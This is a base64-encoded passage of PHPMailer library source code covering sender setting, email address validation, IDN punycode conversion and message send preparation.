ICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzc2VzOwogICAgfQogICAgLyoqCiAgICAgKiBTZXQgdGhlIEZyb20gYW5kIEZyb21OYW1lIHByb3BlcnRpZXMuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHBhcmFtIGJvb2wgICAkYXV0byAgICBXaGV0aGVyIHRvIGFsc28gc2V0IHRoZSBTZW5kZXIgYWRkcmVzcywgZGVmYXVsdHMgdG8gdHJ1ZQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRGcm9tKCRhZGRyZXNzLCAkbmFtZSA9ICcnLCAkYXV0byA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsKICAgICAgICAkbmFtZSA9IHRyaW0ocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJG5hbWUpKTsgLy9TdHJpcCBicmVha3MgYW5kIHRyaW0KICAgICAgICAvLyBEb24ndCB2YWxpZGF0ZSBub3cgYWRkcmVzc2VzIHdpdGggSUROLiBXaWxsIGJlIGRvbmUgaW4gc2VuZCgpLgogICAgICAgICRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpOwogICAgICAgIGlmIChmYWxzZSA9PT0gJHBvcyBvcgogICAgICAgICAgICAoISR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSBvciAhc3RhdGljOjppZG5TdXBwb3J0ZWQoKSkgYW5kCiAgICAgICAgICAgICFzdGF0aWM6OnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsKICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSBzcHJpbnRmKCclcyAoRnJvbSk6ICVzJywKICAgICAgICAgICAgICAgICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSwKICAgICAgICAgICAgICAgICRhZGRyZXNzKTsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+RnJvbSA9ICRhZGRyZXNzOwogICAgICAgICR0aGlzLT5Gcm9tTmFtZSA9ICRuYW1lOwogICAgICAgIGlmICgkYXV0bykgewogICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5TZW5kZXIgPSAkYWRkcmVzczsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBNZXNzYWdlLUlEIGhlYWRlciBvZiB0aGUgbGFzdCBlbWFpbC4KICAgICAqIFRlY2huaWNhbGx5IHRoaXMgaXMgdGhlIHZhbHVlIGZyb20gdGhlIGxhc3QgdGltZSB0aGUgaGVhZGVycyB3ZXJlIGNyZWF0ZWQsCiAgICAgKiBidXQgaXQncyBhbHNvIHRoZSBtZXNzYWdlIElEIG9mIHRoZSBsYXN0IHNlbnQgbWVzc2FnZSBleGNlcHQgaW4KICAgICAqIHBhdGhvbG9naWNhbCBjYXNlcy4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TGFzdE1lc3NhZ2VJRCgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5sYXN0TWVzc2FnZUlEOwogICAgfQogICAgLyoqCiAgICAgKiBDaGVjayB0aGF0IGEgc3RyaW5nIGxvb2tzIGxpa2UgYW4gZW1haWwgYWRkcmVzcy4KICAgICAqIFZhbGlkYXRpb24gcGF0dGVybnMgc3VwcG9ydGVkOgogICAgICogKiBgYXV0b2AgUGljayBiZXN0IHBhdHRlcm4gYXV0b21hdGljYWxseTsKICAgICAqICogYHBjcmU4YCBVc2UgdGhlIHNxdWlsb29wbGUuY29tIHBhdHRlcm4sIHJlcXVpcmVzIFBDUkUgPiA4LjA7CiAgICAgKiAqIGBwY3JlYCBVc2Ugb2xkIFBDUkUgaW1wbGVtZW50YXRpb247CiAgICAgKiAqIGBwaHBgIFVzZSBQSFAgYnVpbHQtaW4gRklMVEVSX1ZBTElEQVRFX0VNQUlMOwogICAgICogKiBgaHRtbDVgIFVzZSB0aGUgcGF0dGVybiBnaXZlbiBieSB0aGUgSFRNTDUgc3BlYyBmb3IgJ2VtYWlsJyB0eXBlIGZvcm0gaW5wdXQgZWxlbWVudHMuCiAgICAgKiAqIGBub3JlZ2V4YCBEb24ndCB1c2UgYSByZWdleDogc3VwZXIgZmFzdCwgcmVhbGx5IGR1bWIuCiAgICAgKiBBbHRlcm5hdGl2ZWx5IHlvdSBtYXkgcGFzcyBpbiBhIGNhbGxhYmxlIHRvIGluamVjdCB5b3VyIG93biB2YWxpZGF0b3IsIGZvciBleGFtcGxlOgogICAgICoKICAgICAqIGBgYHBocAogICAgICogUEhQTWFpbGVyOjp2YWxpZGF0ZUFkZHJlc3MoJ3VzZXJAZXhhbXBsZS5jb20nLCBmdW5jdGlvbigkYWRkcmVzcykgewogICAgICogICAgIHJldHVybiAoc3RycG9zKCRhZGRyZXNzLCAnQCcpICE9PSBmYWxzZSk7CiAgICAgKiB9KTsKICAgICAqIGBgYAogICAgICoKICAgICAqIFlvdSBjYW4gYWxzbyBzZXQgdGhlIFBIUE1haWxlcjo6JHZhbGlkYXRvciBzdGF0aWMgdG8gYSBjYWxsYWJsZSwgYWxsb3dpbmcgYnVpbHQtaW4gbWV0aG9kcyB0byB1c2UgeW91ciB2YWxpZGF0b3IuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAgICAgICAgICAkYWRkcmVzcyAgICAgICBUaGUgZW1haWwgYWRkcmVzcyB0byBjaGVjawogICAgICogQHBhcmFtIHN0cmluZ3xjYWxsYWJsZSAkcGF0dGVybnNlbGVjdCBXaGljaCBwYXR0ZXJuIHRvIHVzZQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcywgJHBhdHRlcm5zZWxlY3QgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsID09PSAkcGF0dGVybnNlbGVjdCkgewogICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9IHN0YXRpYzo6JHZhbGlkYXRvcjsKICAgICAgICB9CiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCRwYXR0ZXJuc2VsZWN0KSkgewogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJHBhdHRlcm5zZWxlY3QsICRhZGRyZXNzKTsKICAgICAgICB9CiAgICAgICAgLy9SZWplY3QgbGluZSBicmVha3MgaW4gYWRkcmVzc2VzOyBpdCdzIHZhbGlkIFJGQzUzMjIsIGJ1dCBub3QgUkZDNTMyMQogICAgICAgIGlmIChzdHJwb3MoJGFkZHJlc3MsICJcbiIpICE9PSBmYWxzZSBvciBzdHJwb3MoJGFkZHJlc3MsICJcciIpICE9PSBmYWxzZSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHBhdHRlcm5zZWxlY3QpIHsKICAgICAgICAgICAgY2FzZSAncGNyZSc6IC8vS2VwdCBmb3IgQkMKICAgICAgICAgICAgY2FzZSAncGNyZTgnOgogICAgICAgICAgICAgICAgLyoKICAgICAgICAgICAgICAgICAqIEEgbW9yZSBjb21wbGV4IGFuZCBtb3JlIHBlcm1pc3NpdmUgdmVyc2lvbiBvZiB0aGUgUkZDNTMyMiByZWdleCBvbiB3aGljaCBGSUxURVJfVkFMSURBVEVfRU1BSUwKICAgICAgICAgICAgICAgICAqIGlzIGJhc2VkLgogICAgICAgICAgICAgICAgICogSW4gYWRkaXRpb24gdG8gdGhlIGFkZHJlc3NlcyBhbGxvd2VkIGJ5IGZpbHRlcl92YXIsIGFsc28gcGVybWl0czoKICAgICAgICAgICAgICAgICAqICAqIGRvdGxlc3MgZG9tYWluczogYGFAYmAKICAgICAgICAgICAgICAgICAqICAqIGNvbW1lbnRzOiBgMTIzNCBAIGxvY2FsKGJsYWgpIC5tYWNoaW5lIC5leGFtcGxlYAogICAgICAgICAgICAgICAgICogICogcXVvdGVkIGVsZW1lbnRzOiBgJyJ0ZXN0IGJsYWgiQGV4YW1wbGUub3JnJ2AKICAgICAgICAgICAgICAgICAqICAqIG51bWVyaWMgVExEczogYGFAYi4xMjNgCiAgICAgICAgICAgICAgICAgKiAgKiB1bmJyYWNrZXRlZCBJUHY0IGxpdGVyYWxzOiBgYUAxOTIuMTY4LjAuMWAKICAgICAgICAgICAgICAgICAqICAqIElQdjYgbGl0ZXJhbHM6ICdmaXJzdC5sYXN0QFtJUHY2OmExOjpdJwogICAgICAgICAgICAgICAgICogTm90IGFsbCBvZiB0aGVzZSB3aWxsIG5lY2Vzc2FyaWx5IHdvcmsgZm9yIHNlbmRpbmchCiAgICAgICAgICAgICAgICAgKgogICAgICAgICAgICAgICAgICogQHNlZSAgICAgICBodHRwOi8vc3F1aWxvb3BsZS5jb20vMjAwOS8xMi8yMC9lbWFpbC1hZGRyZXNzLXZhbGlkYXRpb24vCiAgICAgICAgICAgICAgICAgKiBAY29weXJpZ2h0IDIwMDktMjAxMCBNaWNoYWVsIFJ1c2h0b24KICAgICAgICAgICAgICAgICAqIEZlZWwgZnJlZSB0byB1c2UgYW5kIHJlZGlzdHJpYnV0ZSB0aGlzIGNvZGUuIEJ1dCBwbGVhc2Uga2VlcCB0aGlzIGNvcHlyaWdodCBub3RpY2UuCiAgICAgICAgICAgICAgICAgKi8KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbCkgcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICAgICAnL14oPyEoPz4oPzEpIj8oPz5cXFxbIC1+XXxbXiJdKSI/KD8xKSl7MjU1LH0pKD8hKD8+KD8xKSI/KD8+XFxcWyAtfl18W14iXSkiPyg/MSkpezY1LH1AKScgLgogICAgICAgICAgICAgICAgICAgICcoKD8+KD8+KD8+KCg/Pig/Pig/Plx4MERceDBBKT9bXHQgXSkrfCg/PltcdCBdKlx4MERceDBBKT9bXHQgXSspPykoXCgoPz4oPzIpJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtXCcqLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHg3Rl18KD8zKSkpKig/MilcKSkpKyg/MikpfCg/MikpPyknIC4KICAgICAgICAgICAgICAgICAgICAnKFshIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPzIpKD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4N0ZdKSkqJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/MikiKSg/Pig/MSlcLig/MSkoPzQpKSooPzEpQCg/ISg/MSlbYS16MC05LV17NjQsfSkoPzEpKD8+KFthLXowLTldKD8+W2EtejAtOS1dKlthLXowLTldKT8pJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/Pig/MSlcLig/ISg/MSlbYS16MC05LV17NjQsfSkoPzEpKD81KSl7MCwxMjZ9fFxbKD86KD8+SVB2NjooPz4oW2EtZjAtOV17MSw0fSkoPz46KD82KSl7N30nIC4KICAgICAgICAgICAgICAgICAgICAnfCg/ISg/Oi4qW2EtZjAtOV1bOlxdXSl7OCx9KSgoPzYpKD8+Oig/NikpezAsNn0pPzo6KD83KT8pKXwoPz4oPz5JUHY2Oig/Pig/NikoPz46KD82KSl7NX06JyAuCiAgICAgICAgICAgICAgICAgICAgJ3woPyEoPzouKlthLWYwLTldOil7Nix9KSg/OCk/OjooPz4oKD82KSg/PjooPzYpKXswLDR9KTopPykpPygyNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfScgLgogICAgICAgICAgICAgICAgICAgICd8WzEtOV0/WzAtOV0pKD8+XC4oPzkpKXszfSkpXF0pKD8xKSQvaXNEJywKICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgY2FzZSAnaHRtbDUnOgogICAgICAgICAgICAgICAgLyoKICAgICAgICAgICAgICAgICAqIFRoaXMgaXMgdGhlIHBhdHRlcm4gdXNlZCBpbiB0aGUgSFRNTDUgc3BlYyBmb3IgdmFsaWRhdGlvbiBvZiAnZW1haWwnIHR5cGUgZm9ybSBpbnB1dCBlbGVtZW50cy4KICAgICAgICAgICAgICAgICAqCiAgICAgICAgICAgICAgICAgKiBAc2VlIGh0dHA6Ly93d3cud2hhdHdnLm9yZy9zcGVjcy93ZWItYXBwcy9jdXJyZW50LXdvcmsvI2UtbWFpbC1zdGF0ZS0odHlwZT1lbWFpbCkKICAgICAgICAgICAgICAgICAqLwogICAgICAgICAgICAgICAgcmV0dXJuIChib29sKSBwcmVnX21hdGNoKAogICAgICAgICAgICAgICAgICAgICcvXlthLXpBLVowLTkuISMkJSZcJyorXC89P15fYHt8fX4tXStAW2EtekEtWjAtOV0oPzpbYS16QS1aMC05LV17MCw2MX0nIC4KICAgICAgICAgICAgICAgICAgICAnW2EtekEtWjAtOV0pPyg/OlwuW2EtekEtWjAtOV0oPzpbYS16QS1aMC05LV17MCw2MX1bYS16QS1aMC05XSk/KSokL3NEJywKICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgY2FzZSAncGhwJzoKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbCkgZmlsdGVyX3ZhcigkYWRkcmVzcywgRklMVEVSX1ZBTElEQVRFX0VNQUlMKTsKICAgICAgICB9CiAgICB9CiAgICAvKioKICAgICAqIFRlbGxzIHdoZXRoZXIgSUROcyAoSW50ZXJuYXRpb25hbGl6ZWQgRG9tYWluIE5hbWVzKSBhcmUgc3VwcG9ydGVkIG9yIG5vdC4gVGhpcyByZXF1aXJlcyB0aGUKICAgICAqIGBpbnRsYCBhbmQgYG1ic3RyaW5nYCBQSFAgZXh0ZW5zaW9ucy4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgYHRydWVgIGlmIHJlcXVpcmVkIGZ1bmN0aW9ucyBmb3IgSUROIHN1cHBvcnQgYXJlIHByZXNlbnQKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBpZG5TdXBwb3J0ZWQoKQogICAgewogICAgICAgIHJldHVybiBmdW5jdGlvbl9leGlzdHMoJ2lkbl90b19hc2NpaScpIGFuZCBmdW5jdGlvbl9leGlzdHMoJ21iX2NvbnZlcnRfZW5jb2RpbmcnKTsKICAgIH0KICAgIC8qKgogICAgICogQ29udmVydHMgSUROIGluIGdpdmVuIGVtYWlsIGFkZHJlc3MgdG8gaXRzIEFTQ0lJIGZvcm0sIGFsc28ga25vd24gYXMgcHVueWNvZGUsIGlmIHBvc3NpYmxlLgogICAgICogSW1wb3J0YW50OiBBZGRyZXNzIG11c3QgYmUgcGFzc2VkIGluIHNhbWUgZW5jb2RpbmcgYXMgY3VycmVudGx5IHNldCBpbiBQSFBNYWlsZXI6OiRDaGFyU2V0LgogICAgICogVGhpcyBmdW5jdGlvbiBzaWxlbnRseSByZXR1cm5zIHVubW9kaWZpZWQgYWRkcmVzcyBpZjoKICAgICAqIC0gTm8gY29udmVyc2lvbiBpcyBuZWNlc3NhcnkgKGkuZS4gZG9tYWluIG5hbWUgaXMgbm90IGFuIElETiwgb3IgaXMgYWxyZWFkeSBpbiBBU0NJSSBmb3JtKQogICAgICogLSBDb252ZXJzaW9uIHRvIHB1bnljb2RlIGlzIGltcG9zc2libGUgKGUuZy4gcmVxdWlyZWQgUEhQIGZ1bmN0aW9ucyBhcmUgbm90IGF2YWlsYWJsZSkKICAgICAqICAgb3IgZmFpbHMgZm9yIGFueSByZWFzb24gKGUuZy4gZG9tYWluIGNvbnRhaW5zIGNoYXJhY3RlcnMgbm90IGFsbG93ZWQgaW4gYW4gSUROKS4KICAgICAqCiAgICAgKiBAc2VlICAgIFBIUE1haWxlcjo6JENoYXJTZXQKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIGNvbnZlcnQKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgZW5jb2RlZCBhZGRyZXNzIGluIEFTQ0lJIGZvcm0KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHB1bnllbmNvZGVBZGRyZXNzKCRhZGRyZXNzKQogICAgewogICAgICAgIC8vIFZlcmlmeSB3ZSBoYXZlIHJlcXVpcmVkIGZ1bmN0aW9ucywgQ2hhclNldCwgYW5kIGF0LXNpZ24uCiAgICAgICAgJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJyk7CiAgICAgICAgaWYgKHN0YXRpYzo6aWRuU3VwcG9ydGVkKCkgYW5kCiAgICAgICAgICAgICFlbXB0eSgkdGhpcy0+Q2hhclNldCkgYW5kCiAgICAgICAgICAgIGZhbHNlICE9PSAkcG9zCiAgICAgICAgKSB7CiAgICAgICAgICAgICRkb21haW4gPSBzdWJzdHIoJGFkZHJlc3MsICsrJHBvcyk7CiAgICAgICAgICAgIC8vIFZlcmlmeSBDaGFyU2V0IHN0cmluZyBpcyBhIHZhbGlkIG9uZSwgYW5kIGRvbWFpbiBwcm9wZXJseSBlbmNvZGVkIGluIHRoaXMgQ2hhclNldC4KICAgICAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoJGRvbWFpbikgYW5kIEBtYl9jaGVja19lbmNvZGluZygkZG9tYWluLCAkdGhpcy0+Q2hhclNldCkpIHsKICAgICAgICAgICAgICAgICRkb21haW4gPSBtYl9jb252ZXJ0X2VuY29kaW5nKCRkb21haW4sICdVVEYtOCcsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgICAgIC8vSWdub3JlIElERSBjb21wbGFpbnRzIGFib3V0IHRoaXMgbGluZSAtIG1ldGhvZCBzaWduYXR1cmUgY2hhbmdlZCBpbiBQSFAgNS40CiAgICAgICAgICAgICAgICAkZXJyb3Jjb2RlID0gMDsKICAgICAgICAgICAgICAgICRwdW55Y29kZSA9IGlkbl90b19hc2NpaSgkZG9tYWluLCAkZXJyb3Jjb2RlLCBJTlRMX0lETkFfVkFSSUFOVF9VVFM0Nik7CiAgICAgICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRwdW55Y29kZSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdWJzdHIoJGFkZHJlc3MsIDAsICRwb3MpIC4gJHB1bnljb2RlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYWRkcmVzczsKICAgIH0KICAgIC8qKgogICAgICogQ3JlYXRlIGEgbWVzc2FnZSBhbmQgc2VuZCBpdC4KICAgICAqIFVzZXMgdGhlIHNlbmRpbmcgbWV0aG9kIHNwZWNpZmllZCBieSAkTWFpbGVyLgogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIGZhbHNlIG9uIGVycm9yIC0gU2VlIHRoZSBFcnJvckluZm8gcHJvcGVydHkgZm9yIGRldGFpbHMgb2YgdGhlIGVycm9yCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZW5kKCkKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoISR0aGlzLT5wcmVTZW5kKCkpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnBvc3RTZW5kKCk7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgPSAnJzsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQogICAgLyoqCiAgICAgKiBQcmVwYXJlIGEgbWVzc2FnZSBmb3Igc2VuZGluZy4KICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcHJlU2VuZCgpCiAgICB7CiAgICAgICAgaWYgKCdzbXRwJyA9PSAkdGhpcy0+TWFpbGVyIG9yCiAgICAgICAgICAgICgnbWFpbCcgPT0gJHRoaXMtPk1haWxlciBhbmQgc3RyaXBvcyhQSFBfT1MsICdXSU4nKSA9PT0gMCkKICAgICAgICApIHsKICAgICAgICAgICAgLy9TTVRQIG1hbmRhdGVzIFJGQy1jb21wbGlhbnQgbGluZSBlbmRpbmdzCiAgICAgICAgICAgIC8vYW5kIGl0J3MgYWxzbyB1c2VkIHdpdGggbWFpbCgpIG9uIFdpbmRvd3MKICAgICAgICAgICAgc3RhdGljOjpzZXRMRSgiXHJcbiIpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vTWFpbnRhaW4gYmFja3dhcmQgY29tcGF0aWJpbGl0eSB3aXRoIGxlZ2FjeSBMaW51eCBjb21tYW5kIGxpbmUgbWFpbGVycwogICAgICAgICAgICBzdGF0aWM6OnNldExFKFBIUF9FT0wpOwogICAgICAgIH0KICAgICAgICAvL0NoZWNrIGZvciBidWdneSBQSFAgdmVyc2lvbnMgdGhhdCBhZGQgYSBoZWFkZXIgd2l0aCBhbiBpbmNvcnJlY3QgbGluZSBicmVhawogICAgICAgIGlmIChpbmlfZ2V0KCdtYWlsLmFkZF94X2hlYWRlcicpID09IDEKICAgICAgICAgICAgYW5kICdtYWlsJyA9PSAkdGhpcy0+TWFpbGVyCiAgICAgICAgICAgIGFuZCBzdHJpcG9zKFBIUF9PUywgJ1dJTicpID09PSAwCiAgICAgICAgICAgIGFuZCAoKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzcuMC4wJywgJz49JykKICAgICAgICAgICAgICAgICAgICBhbmQgdmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNy4wLjE3JywgJzwnKSkKICAgICAgICAgICAgICAgIG9yICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc3LjEuMCcsICc+PScpCiAgICAgICAgICAgICAgICAgICAgYW5kIHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzcuMS4zJywgJzwnKSkpCiAgICAgICAgKSB7CiAgICAgICAgICAgIHRyaWdnZXJfZXJyb3IoCiAgICAgICAgICAgICAgICAnWW91ciB2ZXJzaW9uIG9mIFBIUCBpcyBhZmZlY3RlZCBieSBhIGJ1ZyB0aGF0IG1heSByZXN1bHQgaW4gY29ycnVwdGVkIG1lc3NhZ2VzLicgLgogICAgICAgICAgICAgICAgJyBUbyBmaXggaXQsIHN3aXRjaCB0byBzZW5kaW5nIHVzaW5nIFNNVFAsIGRpc2FibGUgdGhlIG1haWwuYWRkX3hfaGVhZGVyIG9wdGlvbiBpbicgLgogICAgICAgICAgICAgICAgJyB5b3VyIHBocC5pbmksIHN3aXRjaCB0byBNYWNPUyBvciBMaW51eCwgb3IgdXBncmFkZSB5b3VyIFBIUCB0byB2ZXJzaW9uIDcuMC4xNysgb3IgNy4xLjMrLicsCiAgICAgICAgICAgICAgICBFX1VTRVJfV0FSTklORwogICAgICAgICAgICApOwogICAgICAgIH0KICAgICAgICB0cnkgewogICAgICAgICAgICAkdGhpcy0+ZXJyb3JfY291bnQgPSAwOyAvLyBSZXNldCBlcnJvcnMKICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgPSAnJzsKICAgICAgICAgICAgLy8gRGVxdWV1ZSByZWNpcGllbnQgYW5kIFJlcGx5LVRvIGFkZHJlc3NlcyB3aXRoIElETgogICAgICAgICAgICBmb3JlYWNoIChhcnJheV9tZXJnZSgkdGhpcy0+UmVjaXBpZW50c1F1ZXVlLCAkdGhpcy0+UmVwbHlUb1F1ZXVlKSBhcyAkcGFyYW1zKSB7CiAgICAgICAgICAgICAgICAkcGFyYW1zWzFdID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCRwYXJhbXNbMV0pOwogICAgICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoWyR0aGlzLCAnYWRkQW5BZGRyZXNzJ10sICRwYXJhbXMpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pICsgY291bnQoJHRoaXMtPmNjKSArIGNvdW50KCR0aGlzLT5iY2MpIDwgMSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygncHJvdmlkZV9hZGRyZXNzJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIFZhbGlkYXRlIEZyb20sIFNlbmRlciwgYW5kIENvbmZpcm1SZWFkaW5nVG8gYWRkcmVzc2VzCiAgICAgICAgICAgIGZvcmVhY2ggKFsnRnJvbScsICdTZW5kZXInLCAnQ29uZmlybVJlYWRpbmdUbyddIGFzICRhZGRyZXNzX2tpbmQpIHsKICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kID0gdHJpbSgkdGhpcy0+JGFkZHJlc3Nfa2luZCk7CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkdGhpcy0+JGFkZHJlc3Nfa2luZCA9ICR0aGlzLT5wdW55ZW5jb2RlQWRkcmVzcygkdGhpcy0+JGFkZHJlc3Nfa2luZCk7CiAgICAgICAgICAgICAgICBpZiAoIXN0YXRpYzo6dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT4kYWRkcmVzc19raW5kKSkgewogICAgICAgICAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gc3ByaW50ZignJXMgKCVzKTogJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJyksCiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzX2tpbmQsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kKTsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIFNldCB3aGV0aGVyIHRoZSBtZXNzYWdlIGlzIG11bHRpcGFydC9hbHRlcm5hdGl2ZQogICAgICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9IHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9BTFRFUk5BVElWRTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkdGhpcy0+c2V0TWVzc2FnZVR5cGUoKTsKICAgICAgICAgICAgLy8gUmVmdXNlIHRvIHNlbmQgYW4gZW1wdHkgbWVzc2FnZSB1bmxlc3Mgd2UgYXJlIHNwZWNpZmljYWxseSBhbGxvd2luZyBpdAogICAgICAgICAgICBpZiAoISR0aGlzLT5BbGxvd0VtcHR5IGFuZCBlbXB0eSgkdGhpcy0+Qm9keSkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VtcHR5X21lc3NhZ2UnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy9UcmltIHN1YmplY3QgY29uc2lzdGVudGx5CiAgICAgI